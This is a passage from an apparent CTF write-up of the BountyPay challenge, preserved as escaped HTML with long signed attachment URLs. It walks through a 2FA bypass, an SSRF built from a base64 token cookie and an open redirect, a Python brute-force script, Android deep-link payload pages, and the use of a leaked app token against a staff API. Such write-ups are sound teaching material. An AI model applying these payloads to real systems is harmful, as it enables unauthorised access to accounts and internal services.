GNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=446ba15eff2c971e33e0b9e9c5b1c41a8b16c392b8701b83522f4043a7daf595\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nAfter successfully using the leaked credentials to login with brian, I hit 2FA.\u003cbr\u003e\nI tried to bypass this by sending any random ten characters alongside the challenge code inside the POST request, Miss.. \u003cbr\u003e\nSo I tried another approach: send any random characters with its correspondent MD5 hash, and apparently, the backend didn’t check for the validity nor the length of the sent code, it only validates if the challenge_answer parameter and the MD5 value of challenge field match.\u003cbr\u003e\n\u003ccode\u003eLong story short: Bull’s eye !\u003c/code\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8QvPKWLVv95rgyv2vmpktif5?response-content-disposition=attachment%3B%20filename%3D%22Picture3.png%22%3B%20filename%2A%3DUTF-8%27%27Picture3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=4f8cd81fee95cfabdbdaacd0cb5365cd823f574a4aef6eadb7a26696c77aa3b5\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8QvPKWLVv95rgyv2vmpktif5?response-content-disposition=attachment%3B%20filename%3D%22Picture3.png%22%3B%20filename%2A%3DUTF-8%27%27Picture3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=4f8cd81fee95cfabdbdaacd0cb5365cd823f574a4aef6eadb7a26696c77aa3b5\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"finding-my-way-to-rome\"\u003eFinding my way to Rome:\u003c/h1\u003e\n\n\u003cp\u003eBrowsing the application, I could only see that it shows the transactions made by the current user and those were sorted by month. \u003cbr\u003e\nI also noticed that a cookie named token is assigned to the session that i logged into. \u003cbr\u003e\nBy Base64-decoding this cookie, I find it is composed of two parts: \u003ccode\u003eaccount_id\u003c/code\u003e and hash which is NOT the MD5 hash of the provided account id. \u003cbr\u003e\nI tried to inject some SQL queries into the account_id parameter since there was a twitter account named \u003ca href=\"/bountypayh\"\u003e@BountypayH\u003c/a\u003e advising to “always check for SQLi”. But no luck!\u003cbr\u003e\nI also noticed that sending any hash other than the one in the first request will not get any result back from the server.\u003c/p\u003e\n\n\u003cp\u003eAt this point of the challenge I didn’t have more options to play with. So, I went back to the git repository and tried to get more information from it, but like a wise man once said, “been here, done that” so I quickly moved to test more hypothesis. \u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003eaccount_id\u003c/code\u003e parameter seems to be random so I couldn’t predict or bruteforce any other valid value. \u003cbr\u003e\nBut reviewing Burp history, I noticed an interesting response from the server: when the transaction button is hit, the application makes a request to \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e and gets the results of the user’s transactions at the following endpoint: \u003ccode\u003e/api/accounts/F8gHiqSdpK/statements?month=01\u0026amp;year=2020.\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eAt this stage, I started to play again with \u003ccode\u003eaccount_id\u003c/code\u003e value in order to understand how the api processes the input values. So I base64-encoded the following input: \u2028\u003cbr\u003e\n\u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK/statements/?\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e\u003cbr\u003e\n\u2028and sent it as the “token” cookie to “statements” endpoint. I got the following response: \u003ccode\u003e\u0026quot;data\u0026quot;:\u0026quot;[\\\u0026quot;Month and Year must be set\\\u0026quot;]\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ewhich indicates that I got my hands on some sort of an SSRF that can potentially give me access to the api without needing any credentials. \u003c/p\u003e\n\n\u003cp\u003eHowever, since the account_id parameter is random, I couldn’t exploit it this way… \u003c/p\u003e\n\n\u003cp\u003eFortunately, while doing the initial recon I had noticed that access to software subdomain is filtered by IP address (so it probably authorized requests from api). I also found a limited open redirect on api platform at redirect endpoint which redirects to \u003ccode\u003ewww.google.com\u003c/code\u003e and some \u003ccode\u003ebountypay.h1ctf.com\u003c/code\u003e subdomains.\u003cbr\u003e\n To chain all this information, I had to check if I could hit redirect endpoint from statements endpoint at \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e. After trial and error I managed to achieve this through the following input: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://software.bountypay.h1ctf.com/?\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture4.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YbgPAtRNNti1dk41XdVnguHE?response-content-disposition=attachment%3B%20filename%3D%22Picture4.png%22%3B%20filename%2A%3DUTF-8%27%27Picture4.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=57dd8a4e2e68706b5206e289a50a3cc484f65663fa6892ea4977ed21289cae55\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YbgPAtRNNti1dk41XdVnguHE?response-content-disposition=attachment%3B%20filename%3D%22Picture4.png%22%3B%20filename%2A%3DUTF-8%27%27Picture4.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=57dd8a4e2e68706b5206e289a50a3cc484f65663fa6892ea4977ed21289cae55\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"ciao-bella\"\u003eCiao Bella!\u003c/h1\u003e\n\n\u003cp\u003eAt this point I had access to software subdomain but it was protected by an authentication page, and since I couldn’t send credentials in GET requests, the only option I had left was to brute force files and directories to see if I could get unrestricted access to some resources.\u003cbr\u003e\nUsing the below python script, I was able to find uploads directory in which I found BountyPay.apk. Began the chapter “Attack on Android”..\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efrom base64 import b64encode\nimport requests\nurl = \u0026quot;https://app.bountypay.h1ctf.com/statements?year=2020\u0026amp;month=04\u0026quot;\ncookies = {}\nfor s in open(\u0026#39;wordlist\u0026#39;, \u0026#39;r\u0026#39;).read().split(\u0026#39;\\n\u0026#39;):\n    token = \u0026#39;{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://software.bountypay.h1ctf.com/%s?\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u0026#39; %s\n    token = b64encode(token)\n    cookies[\u0026quot;token\u0026quot;] = token\n    r = requests.get(url, cookies = cookies, verify=True)\n    if \u0026quot;Not Found\u0026quot; not in r.text:\n        print token\n        print r.text\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"attack-on-android\"\u003eAttack on Android:\u003c/h1\u003e\n\n\u003ch2 id=\"part-1\"\u003ePart 1:\u003c/h2\u003e\n\n\u003cp\u003eI downloaded the apk file by visiting \u003ccode\u003ehttps://software.bountypay.h1ctf.com/uploads/BountyPay.apk\u003c/code\u003e\u003cbr\u003e\nWhen I ran the app on my Android, It offered no interesting content, I tried to capture traffic but nothing was going on, So I decided to dig deeper.\u003c/p\u003e\n\n\u003cp\u003eI decompiled it using apktool, and read java code using Jd-GUI.\u003c/p\u003e\n\n\u003cp\u003eAfter a close look at the app source code and the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e, I noticed three main activities, each of them are invoked through a particular scheme (one,two and three respectively), and all of which had a common host=part. \u003c/p\u003e\n\n\u003cp\u003eAfter a user is registred to the app with her/his username and twitter handle, the MainActivity will create a user_created file and store this information in user shared preferences directory.\u003c/p\u003e\n\n\u003cp\u003eThe code responsible for the validation of the first part is as below:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eString str = getIntent().getData().getQueryParameter(\u0026quot;start\u0026quot;);\n      if (str != null \u0026amp;\u0026amp; str.equals(\u0026quot;PartTwoActivity\u0026quot;) \u0026amp;\u0026amp; sharedPreferences.contains(\u0026quot;USERNAME\u0026quot;)) \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe first part is about sending a deep link which contains start as parameter and a value of PartTwoActivity.\u003c/p\u003e\n\n\u003cp\u003eTo further inspect the contents of the app, I decided to host this code in my server and visited the link from my android device:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;font\u003c/span\u003e \u003cspan class=\"na\"\u003esize=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;center\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;one://part?start=PartTwoActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ehack them all\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/font\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich led me to Part 2.\u003c/p\u003e\n\n\u003ch2 id=\"part-2\"\u003ePart 2:\u003c/h2\u003e\n\n\u003cp\u003eFrom the PartTwoActivity’s source code I noticed that an intent is created and is waiting for two parameters to make its text visible. I visited the following page with those two parameters: \u003ccode\u003etwo=light\u003c/code\u003e and \u003ccode\u003eswitch=on\u003c/code\u003e \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;font\u003c/span\u003e \u003cspan class=\"na\"\u003esize=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;center\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;two://part?two=light\u0026amp;switch=on\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ehack them all\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/font\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter hitting this link, I could see an input text that expects a new value in order to validate this part (the provided value is the MD5 hash of “token” string). The \u003ccode\u003esubmitInfo\u003c/code\u003e method has a listener on \u003ccode\u003echildRef\u003c/code\u003e instance which points to “header” value. On the same method, there is a public method named \u003ccode\u003eonDataChange\u003c/code\u003e which compares str1 and str2 strings and validate this part by writing “PARTTWO:COMPLETE” in created_user file. After entering “X-Token” value into the text field and hitting submit, Part 2 was validated.\u003c/p\u003e\n\n\u003ch2 id=\"part-3\"\u003ePart 3:\u003c/h2\u003e\n\n\u003cp\u003eI noticed in \u003ccode\u003ePartThreeActivity\u003c/code\u003e that an intent is waiting for a base64 encoded values for three and switch parameters to be \u003ccode\u003eUGFydFRocmVlQWN0aXZpdHk=\u003c/code\u003e and \u003ccode\u003eb24=\u003c/code\u003e respectively. To validate this part, I needed to invoke \u003ccode\u003esubmitHash\u003c/code\u003e method which will then invoke \u003ccode\u003ecorrectHash\u003c/code\u003e method that will trigger the \u003ccode\u003eCongratsActivity\u003c/code\u003e. The \u003ccode\u003esubmitHash\u003c/code\u003e is waiting for the value of header which is no other than the value of “TOKEN” in created_user.xml file.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egeneric_x86:/data/data/bounty.pay/shared_prefs # cat user_created.xml                                                                                               \n\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39; standalone=\u0026#39;yes\u0026#39; ?\u0026gt;\n\u0026lt;map\u0026gt;\n    \u0026lt;string name=\u0026quot;PARTTWO\u0026quot;\u0026gt;COMPLETE\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;USERNAME\u0026quot;\u0026gt;hecsv\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;HOST\u0026quot;\u0026gt;http://api.bountypay.h1ctf.com\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;PARTONE\u0026quot;\u0026gt;COMPLETE\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;TWITTERHANDLE\u0026quot;\u0026gt;@hecsv\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;TOKEN\u0026quot;\u0026gt;8e9998ee3137ca9ade8f372739f062c1\u0026lt;/string\u0026gt;\n\u0026lt;/map\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, let’s get serious.\u003c/p\u003e\n\n\u003ch1 id=\"give-to-marten-what-belongs-to-marten\"\u003eGive to Marten what belongs to Marten:\u003c/h1\u003e\n\n\u003ch2 id=\"infiltrating-the-staff\"\u003eInfiltrating the staff:\u003c/h2\u003e\n\n\u003cp\u003eAfter the Android surrendered the TOKEN, I used it to communicate with the REST api. That is how I discovered the “api/staff” endpoint which gave me info on two staff members: Sam and Brian. \u003cbr\u003e\nI changed GET to POST method to see when it could get me, but it returned  [\u0026quot;Missing Parameter\u0026quot;], which indicated that I needed another parameter to create a new staff member. The GET method gives me the name of the missing parameter: \u003ccode\u003ename\u003c/code\u003e and \u003ccode\u003estaff_id\u003c/code\u003e. \u003cbr\u003e\nBut even then, I couldn’t create any valid account since it was looking for a valid \u003ccode\u003estaff_id\u003c/code\u003e parameter. Then a hint from the CTF creators came to the rescue. Sandra Allison which is a newly recruited staff was very happy to join BountyPay company and her tweet offered us valuable information. Her badge was showing her staff id which was the missing piece of the puzzle.\u003c/p\u003e\n\n\u003cp\u003eUsing her credentials, I was able to login to \u003ccode\u003ehttps://staff.bountypay.h1ctf.com\u003c/code\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture5.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MSb6H3DttrM1mMMQThR4HTkh?response-content-disposition=attachment%3B%20filename%3D%22Picture5.png%22%3B%20filename%2A%3DUTF-8%27%27Picture5.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp